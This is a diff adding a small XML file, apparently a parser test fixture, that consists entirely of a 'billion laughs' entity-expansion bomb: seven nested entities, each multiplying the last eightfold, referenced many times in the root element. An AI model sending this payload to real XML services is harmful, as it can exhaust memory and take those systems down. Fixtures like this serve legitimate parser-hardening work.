@@ -1,0 +1,11 @@
+<!DOCTYPE bomb [
+        <!ENTITY a "123456789032444443243444444354454645243243232443244444465452212312344444442312344" >
+        <!ENTITY a1 "&a;&a;&a;&a;&a;&a;&a;&a;">
+        <!ENTITY b "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+        <!ENTITY b1 "&b;&b;&b;&b;&b;&b;&b;&b;">
+        <!ENTITY c "&b1;&b1;&b1;&b1;&b1;&b1;&b1;&b1;">
+        <!ENTITY c1 "&c;&c;&c;&c;&c;&c;&c;&c;">
+        <!ENTITY d "&c1;&c1;&c1;&c1;&c1;&c1;&c1;&c1;">
+        <!ELEMENT bomb (#PCDATA)>
+        ]>
+<bomb>&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;v&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;</bomb>
